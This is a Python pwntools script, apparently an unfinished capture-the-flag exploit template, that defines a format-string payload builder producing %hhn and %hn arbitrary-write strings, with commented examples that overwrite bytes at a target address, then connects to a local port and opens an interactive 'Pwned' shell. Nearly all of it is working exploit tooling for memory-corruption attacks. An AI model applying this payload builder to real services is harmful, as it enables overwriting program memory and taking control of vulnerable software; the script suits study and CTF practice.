# not yet completed

from pwn import *

class format_s:
    value_now = 0
    payload_string = b""

    def start(self):
        self.value_now = 0
        self.payload_string = b""
        return self

    def hhn(self, write_value, parameter_index):
        b = 0x100
        d = ((write_value - self.value_now) % b + b) % b
        if d == 0:
            self.payload_string += b"%%%d$hhn" % parameter_index
        else:
            self.payload_string += b"%%%dc%%%d$hhn" % (d, parameter_index)
        self.value_now += d
        return self

    def hn(self, write_value, parameter_index):
        b = 0x10000
        d = ((write_value - self.value_now) % b + b) % b
        if d == 0:
            self.payload_string += b"%%%d$hn" % parameter_index
        else:
            self.payload_string += b"%%%dc%%%d$hn" % (d, parameter_index)
        self.value_now += d
        return self

    def ljust(self, size, byte='\x00'):
        assert len(self.payload_string) <= size     # ljust is too short
        self.value_now += size - len(self.payload_string)
        self.payload_string = self.payload_string.ljust(size, byte)
        return self

    def append(self, append_s):
        self.value_now += len(append_s)
        self.payload_string += append_s
        return self

    def get(self):
        return self.payload_string

fmt = format_s()
# usage
# target_address = 0x60106c
# payload = fmt.start().hhn(0xda, 8).ljust(16, b"A").append(p64(target_address)).get()
# payload = fmt.start().hhn(0xfa, 12).hhn(0xce, 13).hhn(0xb0, 14).hhn(0x0c, 15).ljust((12 - 6) * 8, b"A").append(p64(target_address)).append(p64(target_address + 0x1)).append(p64(target_address + 0x2)).append(p64(target_address + 0x3)).get()

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = True

host = ""
port = 0
if is_local:
    host = "127.0.0.1"
    port = 8888
r = remote(host, port)

input("Attach in gdb and press Enter")

#payload = flat([])
#log.info("payload: " + str(payload))

#r.recvuntil(":")
#r.sendline(payload)
r.interactive("Pwned # ")
